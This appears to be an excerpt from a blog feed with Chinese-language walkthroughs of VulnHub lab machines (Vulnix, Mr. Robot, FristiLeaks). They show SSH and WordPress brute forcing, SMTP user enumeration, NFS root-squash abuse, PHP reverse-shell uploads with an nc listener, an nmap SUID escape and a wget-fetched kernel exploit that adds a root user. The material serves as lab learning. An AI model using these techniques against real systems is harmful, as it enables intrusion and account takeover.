href="http://blog.csdn.net/yesuhuangsi/article/details/66475053%EF%BC%88ssh%E4%BD%BF%E7%94%A8RSA%E5%85%AC%E9%92%A5%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%EF%BC%89">http://blog.csdn.net/yesuhuangsi/article/details/66475053（ssh使用RSA公钥免密登录远程主机）</a>**</p><p>          <a href="https://www.jianshu.com/p/72e892ab8edf">https://www.jianshu.com/p/72e892ab8edf</a><br>(三步实现SSH无密码登录)**<br>**</p><p>**          <a href="http://man.linuxde.net/nano">http://man.linuxde.net/nano</a> （编辑器nano用法）**</p><p><strong>将靶机root_squash，更改为no_root_squash.</strong></p><blockquote><p>no_root_squash：登入 NFS 主机使用分享目录的使用者，如果是 root<br>的话，那么对于这个分享的目录来说，他就具有 root<br>的权限！这个项目『极不安全』，不建议使用！</p><p>root_squash：在登入 NFS 主机使用分享之目录的使用者如果是 root<br>时，那么这个使用者的权限将被压缩成为匿名使用者，通常他的 UID 与 GID<br>都会变成 nobody 那个系统账号的身份。</p></blockquote><p><a href="https://www.cnblogs.com/dantes91/p/5007992.html">关于nfs共享目录的使用技巧</a>，如果没有用过nfs服务，学习下。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-8be58c6b635481e1.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>显示远程服务器共享目录<br>:::<br>:::</p><p><strong>将远程共享目录挂载到本地</strong>，/tmp/nfs<br>是本地的一个目录。如果没有该目录，可以用”mkdir /tmp/nfs”来新建。<br>mount -t nfs 192.168.1.113:/home/vulnix <strong>/tmp/nfs</strong></p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-178665a456328798.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>**writup: <a href="http://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm/">http://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm\</a><br>**</p><p><strong>靶机重启后，有root权限，就可以用gcc编译exp了。</strong></p><p>**cp /root/Desktop/shell.c .<br>**</p><p>**gcc shell.c -o shell<br>**</p><p>**chmod +x shell<br>**</p><p>**./shell<br>**</p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h1><p><strong>nfs网络文件系统以前根本没用过，，协议不是很熟悉，所以也不知道怎么利用。。</strong></p><p><strong>no_root_squash提权，就好比ftp协议的匿名用户读写权限吧，我是这么想的。。</strong></p><p><strong>简单邮件协议smtp配置不当会泄露用户名什么的，再利用ssh爆破真是骚操作。。</strong><br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>training</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>training</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/12/03/NFS%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%88snmp%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86+ssh%E7%88%86%E7%A0%B4%EF%BC%89.html/"/>
+    <url>/2017/12/03/NFS%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%88snmp%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86+ssh%E7%88%86%E7%A0%B4%EF%BC%89.html/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>HackLAB: Vulnix第一关（侦察）<br>=============================</p><p><a href="https://www.rebootuser.com/?p=933">下载地址</a>,<a href="https://medium.com/@Kan1shka9/hacklab-vulnix-walkthrough-b2b71534c0eb">writeup</a></p><blockquote><p>nmap 192.168.1.109 -Pn -sV</p><p>22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1 (<strong>Ubuntu Linux</strong>;<br>protocol 2.0)</p><p><strong>25/tcp  open  smtp      Postfix smtpd</strong></p><p>79/tcp  open  finger    Linux fingerd</p><p>110/tcp  open  pop3?</p><p>111/tcp  open  rpcbind    2-4 (RPC #100000)</p><p>143/tcp  open  imap      Dovecot imapd</p><p>512/tcp  open  exec      netkit-rsh rexecd</p><p>513/tcp  open  login      OpenBSD or Solaris rlogind</p><p>514/tcp  open  tcpwrapped</p><p>993/tcp  open  ssl/imap  Dovecot imapd</p><p>995/tcp  open  ssl/pop3s?</p><p><strong>2049/tcp open  nfs_acl</strong>    2-3 (RPC #100227)</p></blockquote><p>分析：该主机开放了简单邮件服务（端口25，SMTP）、NFS (Network<br>FileSystem)网络文件系统，看来该主机提供了多种服务，不过这种开放端口只怕只有进了内网才有。系统版本Linux<br>2.6.32 - 3.10</p><p>先用medusa爆破，先跑着字典，也不碍事。然后探测有没有服务的漏洞。<a href="https://wiki.skullsecurity.org/Passwords">字典下载地址</a></p><blockquote><p>medusa -h 192.168.1.109 -U /root/Desktop/john.txt -P<br>/root/Desktop/pass.txt -e ns -M ssh -t 10 -O ssh.log</p></blockquote><p>经过一段时间，爆破效果不佳。</p><h1 id="检查弱口令："><a href="#检查弱口令：" class="headerlink" title="检查弱口令："></a>检查弱口令：</h1><blockquote><p>nmap --script=auth 192.168.1.109</p></blockquote><blockquote><p>22/tcp open ssh</p><p>| ssh-auth-methods:</p><p><strong>|  Supported authentication methods: <br>支持的验证方式：<a href="http://blog.csdn.net/zoucui/article/details/6135078">publickey</a>，password。后一种是传统的验证方式</strong></p><p><strong>|    publickey</strong></p><p><strong>|_    password</strong></p><p>|_ssh-publickey-acceptance: ERROR: Script execution failed (use -d<br>to debug)</p><p>25/tcp  open  smtp</p><p>| smtp-enum-users:</p><p><strong>|_  Method RCPT returned a unhandled status code.</strong></p></blockquote><h1 id="SMTP简单邮件传输协议："><a href="#SMTP简单邮件传输协议：" class="headerlink" title="SMTP简单邮件传输协议："></a>SMTP简单邮件传输协议：</h1><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-87d35feefd490a45.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>摘自《堆栈攻击：八层网络安全防御》<br>:::<br>:::</p><blockquote><p>nmap有个脚本，枚举存在的用户名。<a href="https://nmap.org/nsedoc/scripts/smtp-enum-users.html">https://nmap.org/nsedoc/scripts/smtp-enum-users.html</a></p><p>nmap --script smtp-enum-users.nse -p 25 192.168.1.109</p><p>结果：Couldn&#39;t find any accounts</p><p>nmap --script-args smtp-enum-users.methods={EXPN,RCPT,VRFY} -p 25<br>192.168.1.109</p><p>结果2：Failed to resolve &quot;smtp-enum-users.methods=RCPT&quot;.</p><p>            Failed to resolve &quot;smtp-enum-users.methods=VRFY&quot;. Nmap<br>scan report for 192.168.1.109</p></blockquote><p>命令分析：</p><p>smtp提供了一个额外的功能，通过命令来检查用户名或额外的邮件列表。使用的是<br>VRFY and EXPN commands。</p><p>VRFY命令，能够检测系统上是否存在特定的邮件账户。如果服务器能够接受该命令，那么就可能遭受暴力枚举攻击。</p><p><a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum">枚举smtp用户工具</a></p><blockquote><p>smtp-user-enum -M VRFY -U<br>/usr/share/metasploit-framework/data/wordlists/unix_users.txt -t<br>192.168.1.109</p></blockquote><blockquote><p>枚举结果：</p><p>192.168.1.109: ROOT exists</p><p>192.168.1.109: backup exists</p><p>192.168.1.109: bin exists</p><p>192.168.1.109: daemon exists</p><p>192.168.1.109: games exists</p><p>192.168.1.109: gnats exists</p><p>192.168.1.109: irc exists</p><p>192.168.1.109: libuuid exists</p><p>192.168.1.109: list exists</p><p>192.168.1.109: lp exists</p><p>192.168.1.109: mail exists</p><p>192.168.1.109: man exists</p><p>192.168.1.109: messagebus exists</p><p>192.168.1.109: news exists</p><p>192.168.1.109: nobody exists</p><p>192.168.1.109: postmaster exists</p><p>192.168.1.109: proxy exists</p><p>192.168.1.109: root exists</p><p>192.168.1.109: sshd exists</p><p>192.168.1.109: sync exists</p><p>192.168.1.109: sys exists</p><p>192.168.1.109: syslog exists</p><p>192.168.1.109: user exists</p><p>192.168.1.109: uucp exists</p><p>192.168.1.109: www-data exists</p></blockquote><h1 id="结果验证："><a href="#结果验证：" class="headerlink" title="结果验证："></a>结果验证：</h1><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-0a6f89adddf3f7fa.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>用VRFY命令验证：如果用户存在，那么显示252，如果用户不存在，显示550。</p><h1 id="ssh爆破："><a href="#ssh爆破：" class="headerlink" title="ssh爆破："></a>ssh爆破：</h1><p>爆破其实就是一个字典+运气的问题，在这里我作弊了，em..........…不作弊的话，应该将搜集到的所有用户名加入到一个字典里。</p><blockquote><p>hydra -l user -P /root/Desktop/pass.txt 192.168.1.109 ssh -t 4</p></blockquote><blockquote><p>结果：[DATA] attacking ssh://192.168.1.109:22/</p><p>[22][ssh] host: 192.168.1.109  login: user  password: <strong>letmein</strong></p><p>1 of 1 target successfully completed, 1 valid password found</p></blockquote><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-93b2cde8083c3872.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p><a href="https://www.jianshu.com/p/af9132c8a268">下篇：https://www.jianshu.com/p/af9132c8a268</a><br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>training</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>training</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/12/03/mr-robot%EF%BC%88SUID%EF%BC%89%E6%8F%90%E6%9D%83.html/"/>
+    <url>/2017/12/03/mr-robot%EF%BC%88SUID%EF%BC%89%E6%8F%90%E6%9D%83.html/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>前景提要：上次通过爆破后台，修改404.php获得一个webshell。现在学习提权。</p><p>id、whoami、hostname</p><blockquote><p>信息：daemon用户，uid=1说明是系统用户，主机名linux</p></blockquote><p>cd home/robot</p><blockquote><p>信息：获得另一个key（2/3），和passwd文件，文件内容：</p><p>robot:c3fcd3d76192e4007dfb496cca67e13b</p></blockquote><p>MD5解码：abcdefghijklmnopqrstuvwxyz</p><p>(⊙﹏⊙)这个明显是偏CTF，而不是模拟真实渗透环境啊。</p><p>su robot/abcdefghijklmnopqrstuvwxyz</p><hr><p>寻找有<a href="https://www.jianshu.com/p/45e60bed314e">SUID权限</a>的文件。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-e3705143f79975d2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>于是通过nmap提权。</p><p>查看nmap版本：/usr/local/bin/nmap --version   或者 nmap -V</p><p>老版本的nmap(2.02-5.21)有一个交互模式，使得用户可以执行shell。</p><blockquote><p>nmap --interactive</p><p>!sh</p><p>pwd</p><p>cd root</p><p>ls</p></blockquote><p>获得第三个key.<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>training</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>training</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/12/02/mr-robot%EF%BC%88%E7%88%86%E7%A0%B4%E5%90%8E%E5%8F%B0+SUID%E6%8F%90%E6%9D%83%EF%BC%89.html/"/>
+    <url>/2017/12/02/mr-robot%EF%BC%88%E7%88%86%E7%A0%B4%E5%90%8E%E5%8F%B0+SUID%E6%8F%90%E6%9D%83%EF%BC%89.html/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br><a href="https://www.vulnhub.com/entry/mr-robot-1,151/">靶机下载地址</a>：扫一扫，linux系统，发现只开了80、443，进去看一看，web页面是一个模拟linux终端的页面</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-595353543a444102.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>如果输入指定的命令，则会出现一段视频，或者一些文字，(⊙﹏⊙)这个靶机到底想传达什么。</p><p>如果输入以外的命令，显示command not recongnized...</p><p>查看主页面的源代码，发现两个注释，什么东东？</p><blockquote><p>1.you are not alone.你并不孤独</p><p>2.如果是ie9浏览器，显示，你使用一个过时的浏览器，请到<a href="https://browsehappy.com/%E5%8D%87%E7%BA%A7%E4%BD%A0%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%8C%E6%8F%90%E5%8D%87%E6%B5%8F%E8%A7%88%E4%BD%93%E9%AA%8C%E3%80%82">https://browsehappy.com/升级你的浏览器，提升浏览体验。</a></p></blockquote><p>用paros扫描，没有发现明显的漏洞。</p><p>发现目录/audio , /css ,/js ，用浏览器访问，显示403 forbidden</p><hr><p>看来，要看看提供的六个命令。依次输入了这些命令，了解到，这个服务器是一个组织fsociety的，这个组织貌似是反||美的一个z-f组织，最后一个命令join会要求你提供一个邮箱，还说会跟你联系。。</p><p>然而如何突破防线，没有任何思路。</p><p>这时候注意到，浏览器是这样，<a href="http://192.168.1.116/wakeup%EF%BC%8C%E8%AF%B4%E6%98%8E%E6%98%AF%E9%80%9A%E8%BF%87get%E6%96%B9%E5%BC%8F%E8%AF%B7%E6%B1%82%E9%A1%B5%E9%9D%A2%E7%9A%84%E3%80%82">http://192.168.1.116/wakeup，说明是通过get方式请求页面的。</a></p><p>于是不在终端输入，而直接在url上输入。输入任何东西，都会跳转到下图所示页面，而且显示xx（你输入的字符）404not<br>found.</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-a34d0d23bc9de395.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>了解到，该网站是用wordpress搭建的，yoxi~</p><p>扫描下后台，用的我写的<a href="https://www.jianshu.com/p/b4cfa0cf5ad0">脚本</a></p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-8c6b32b54839247d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>em?用浏览器打开，然后页面就一直抽搐。。</p><blockquote><p>wget <a href="http://192.168.1.116/admin/index.html">http://192.168.1.116/admin/index.html</a></p><p>firefox index.html</p></blockquote><p>浏览器打开后，发现是白页，查看源代码，和<a href="http://192.168.1.116/">http://192.168.1.116</a><br>的源代码并没有什么差别，不过又注意到了原先没注意的一条代码。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-698226211ae2689c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>难道要伪造IP——208.185.115.6，才能访问index.html？</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-be518359b82d87e7.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>然而，并没有什么区别，响应还是那个页面。。</p><p>访问/admin页面，显示301 Moved<br>Permanently永久重定向？页面显示重定向的页面是/admin/，打开一看，又是老页面。</p><hr><p>好吧，放弃该死的后台寻找，看看writeup</p><blockquote><p>wpscan --url 192.168.1.116 --enumerate p</p></blockquote><p><a href="https://tools.kali.org/web-applications/wpscan">wpscan介绍</a>：用wordpress专用扫描器，，</p><blockquote><p><a href="http://192.168.1.116/robots.txt">http://192.168.1.116/robots.txt</a></p><p><a href="http://192.168.1.116/wp-content/plugins/google-analytics-for-wordpress/readme.txt">http://192.168.1.116/wp-content/plugins/google-analytics-for-wordpress/readme.txt</a></p><p><a href="http://192.168.1.116/wp-content/plugins/contact-form-7/">http://192.168.1.116/wp-content/plugins/contact-form-7/</a></p><p>...............</p></blockquote><p>扫描出了很多目录，而且获得了一个key（总共有三个，靶机下载介绍过）。而且扫描器指出，可能有存储型XSS。</p><hr><p>终于找到一个突破点了，不容易啊。。。对xss不熟悉的同学，跟我复习一下好了。</p><p>xss，cross-site-scipt跨站脚本攻击：web提供了输入输出的地方（这是正常功能对吧？)，如果没有过滤，就可以输入脚本。</p><p>如果脚本可以永久存储，就叫存储型xss（打击面为所有访问网站的客户端），若不能，就叫反射型xss。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-d4873ff38d134380.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>并没有弹框<br>:::<br>:::</p><p>呃。。不会了</p><hr><p>nikto扫描器试试，还挺给力的，找到后台。。</p><blockquote><p>nikto -h <a href="http://192.168.1.116/">http://192.168.1.116</a></p></blockquote><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-02333f907734ae94.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><blockquote><p>wget <a href="http://192.168.1.116/fsocity.dic">http://192.168.1.116/fsocity.dic</a> &gt; fsociety.txt   <br>这个目录是robots.txt指出来的</p></blockquote><p>用来爆破后台，作为用户名字典。<a href="http://www.hackingarticles.in/brute-force-website-login-page-using-burpsuite-beginner-guide/">参考文献</a></p><p><a href="https://support.portswigger.net/customer/portal/articles/1964020-using-burp-to-brute-force-a-login-page">burp爆破</a>，扫描一段时间后，通常错误页面Length长度为4073，然后找到一个4124的，虽然没有找到用户名和密码，但是elliot这个用户名是存在的。。</p><p>吐血，居然有登陆表单的错误信息不是”无效的用户名或密码”，而是”你输入的xx用户名的密码是错的哦~“</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-a75652ac1d850bda.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>然后就换一下payload，用户名设置为elliot，密码设置为一个txt字典。</p><p>遗憾的是，并没有爆破出来，没有好的字典吧。。</p><p>呃，再试试fsociety.txt 作为密码字典，有近86万条，扫了好久。。</p><hr><p>方法二：用wpscan爆破，wpscan --url <a href="http://192.168.1.116/">http://192.168.1.116/</a> --wordlist<br>/root/fs.txt --username elliot</p><p>爆破结果，密码是<strong>ER28-0652</strong></p><h1 id="尝试获取webshell"><a href="#尝试获取webshell" class="headerlink" title="尝试获取webshell"></a><strong>尝试获取webshell</strong></h1><p><strong>1.直接上传php脚本，有限制。</strong></p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-08f9050e8898cf4f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>2.用msfvenom生成php载荷，<a href="https://www.jianshu.com/p/52a668889512">参考这个实验中的方式</a>。</p><p>成功上传攻击载荷。</p><p>但是访问<a href="http://192.168.1.116/wp-content/uploads/2018/02/xxd.gif">http://192.168.1.116/wp-content/uploads/2018/02/xxd.gif</a></p><p>本地没有获得metapreter。</p><p>（猜测）反弹metapreter失败了。。</p><p>这是为什么，，难道因为没有文件包含就执行不了么，不可能吧。</p><p>猜测：本地文件包含是在服务端，运行payload。而访问这个链接，服务端直接将gif文件发送过来，浏览器打开失败（本来就不是真的图片）。所以没有达到运行的目的。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-c8a8959e81a0743a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>3.F12-响应头，获得服务器php版本，PHP/5.5.29。这个版本有点高啊，不能截断上传了。</p><p>抱着死猫碰上瞎耗子的心情，试了试，果然不能。试了试该文件名后缀为.jpg，无效。</p><p>4.<a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">下载一个php-reverse-shell，然后修改ip</a>。既然不能上传新的php文件，那么修改现有的php文件。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-52efe710aefbdf89.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>只要运行一下错误页面，就获得了一个shell。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-72f68fff63937eb7.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><blockquote><p>本次突破防线，利用的是后台提示用户名和密码太”贴心”。</p><p>如果提示”登陆失败，错误的用户名或密码。”</p><p>再加上一个强密码。（本次爆破成功，密码强度还可以，不算弱密码）爆破的成功率可以忽略不计。</p></blockquote><blockquote><p>学习了wpscan、nikto扫描。</p><p>不要依赖单一的工具。。</p></blockquote><blockquote><p>学习了一种新的获取webshell的思路</p></blockquote><p>前景提要：上次通过爆破后台，修改404.php获得一个webshell。现在学习提权。</p><p>id、whoami、hostname</p><blockquote><p>信息：daemon用户，uid=1说明是系统用户，主机名linux</p></blockquote><p>cd home/robot</p><blockquote><p>信息：获得另一个key（2/3），和passwd文件，文件内容：</p><p>robot:c3fcd3d76192e4007dfb496cca67e13b</p></blockquote><p>MD5解码：abcdefghijklmnopqrstuvwxyz</p><p>(⊙﹏⊙)这个明显是偏CTF，而不是模拟真实渗透环境啊。</p><p>su robot/abcdefghijklmnopqrstuvwxyz</p><hr><p>寻找有<a href="https://www.jianshu.com/p/45e60bed314e">SUID权限</a>的文件。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-e3705143f79975d2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>于是通过nmap提权。</p><p>查看nmap版本：/usr/local/bin/nmap --version   或者 nmap -V</p><p>老版本的nmap(2.02-5.21)有一个交互模式，使得用户可以执行shell。</p><blockquote><p>nmap --interactive</p><p>!sh</p><p>pwd</p><p>cd root</p><p>ls</p></blockquote><p>获得第三个key.<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>training</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>training</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/12/01/FristiLeaks%EF%BC%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%EF%BC%89.html/"/>
+    <url>/2017/12/01/FristiLeaks%EF%BC%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%EF%BC%89.html/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br><a href="https://www.vulnhub.com/entry/fristileaks-13,133/">靶机下载</a>：修改靶机mac地址为08:00:27:A5:A6:76<br>，然后愉快的开始做实验。</p><p>只开了80端口，Linux 2.6.32 - 3.10</p><p>一、侦察</p><p>Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</p><blockquote><p><a href="http://192.168.1.115/robots.txt">http://192.168.1.115/robots.txt</a></p></blockquote><blockquote><p>robots.txt内容，</p><p>User-agent: *</p><p>Disallow: /cola                </p><p>Disallow: /sisi</p><p>Disallow: /beer</p></blockquote><blockquote><p><a href="http://192.168.1.115/cola">http://192.168.1.115/cola</a>   </p><p> img src=&quot;/images/3037440.jpg&quot;</p></blockquote><p><a href="http://192.168.1.115/icons/README">http://192.168.1.115/icons/README</a></p><p><a href="http://192.168.1.115/icons/small/">http://192.168.1.115/icons/small/</a></p><blockquote><p>403 forbidden:</p><p><a href="http://192.168.1.115/error/">http://192.168.1.115/error/</a></p><p><a href="http://192.168.1.115/cgi-bin/">http://192.168.1.115/cgi-bin/</a></p></blockquote><p>分析：</p><p>dirbuster找不出什么了，然后无思路。</p><hr><p>二：突破点</p><p>尝试生成网页字典，然后给dirbuster</p><p>cewl -d 2 -m 5 -w test.txt <a href="http://192.168.1.115/">http://192.168.1.115</a></p><p>无效</p><p>主页面有张图片，keep calm and drink fristi</p><p>然后找到后台： <a href="http://192.168.1.115/fristi%EF%BC%8C%E6%97%A0%E8%AF%AD">http://192.168.1.115/fristi，无语</a></p><p>查看源代码，有一条base64编码的注释。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-40d6c35b85d9b1e1.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>找个在线base64解码网站，解码后得到一个图片。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-b13a4f466af3616a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>用eezeepz  /   keKkeKKeKKeKkEkkEk    登陆，用户名密码都是源代码里有的。</p><p>三：文件上传拿webshell。</p><p>登陆后有个上传页面，随便上传一个。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-79e4243bb6fc0e25.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>提示：Sorry, is not a valid file. Only allowed are: png,jpg,gif </p><p>Sorry, file not uploaded</p><p>上传jpg，提示：</p><p>Uploading, please wait</p><p>The file has been uploaded to **/uploads **</p><p>通过该路径可以访问，<a href="http://192.168.1.115/fristi/uploads/mm.jpg">http://192.168.1.115/fristi/uploads/mm.jpg</a></p><hr><p>先靶机监听，kali运行：nc -lvp 1234</p><p>准备php反弹shell，以前文章说过，这里不展开了。</p><p>后缀加个.jpg，成功上传，说明php只是通过后缀判断，没有过滤任何字符。</p><p>访问这个链接，kali获得shell.</p><p><a href="http://192.168.1.115/fristi/uploads/php-reverse-shell.php.jpg">http://192.168.1.115/fristi/uploads/php-reverse-shell.php.jpg</a></p><p>四：webshell提权</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-da1baac4c17804ba.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><blockquote><p>tail -6 /etc/passwd</p></blockquote><p>信息：大于500的普通用户有4个。</p><p>eezeepz:x:500:500::/home/eezeepz:/bin/bash</p><p>admin:x:501:501::/home/admin:/bin/bash</p><p>fristigod:x:502:502::/var/fristigod:/bin/bash</p><p>fristi:x:503:100::/var/www:/sbin/nologin</p><blockquote><p>uname -a</p></blockquote><p>Linux localhost.localdomain <strong>2.6.32</strong>-573.8.1.el6.x86_64 #1 SMP Tue<br>Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</p><h4 id="尝试内核漏洞提权："><a href="#尝试内核漏洞提权：" class="headerlink" title="尝试内核漏洞提权："></a>尝试内核漏洞提权：</h4><p><a href="https://www.exploit-db.com/exploits/40839/">Linux Kernel 2.6.22 &lt; 3.9</a></p><p>gcc可以用，wget可以用，nc不可以用（command not find）。</p><p>wget <a href="http://192.168.1.107/1.c">http://192.168.1.107/1.c</a></p><blockquote><p>sh-4.1$ gcc 1.c</p><p>gcc 1.c</p><p>/tmp/cc9pS0Iv.o: In function `generate_password_hash&#39;:</p><p>1.c:(.text+0x1e): undefined reference to `crypt&#39;</p><p>/tmp/cc9pS0Iv.o: In function `main&#39;:</p><p>1.c:(.text+0x4f3): undefined reference to `pthread_create&#39;</p><p>1.c:(.text+0x527): undefined reference to `pthread_join&#39;</p><p>collect2: ld returned 1 exit status</p><p>直接编译，出错</p></blockquote><p>查看exploit-db的注释，再次编译：gcc -pthread 1.c -lcrypt</p><blockquote><p>sh-4.1$ ./a.out</p><p>./a.out</p><p>Please enter the new password: a</p><p>/etc/passwd successfully backed up to /tmp/passwd.bak</p><p>Complete line:</p><p>firefart:fi2D0F2yP3cfM:0:0:pwned:/root:/bin/bash</p><p>mmap: 7fa0ba71d000</p><p>ptrace 0</p><p>Done! Check /etc/passwd to see if the new user was created.</p><p>You can log in with the username 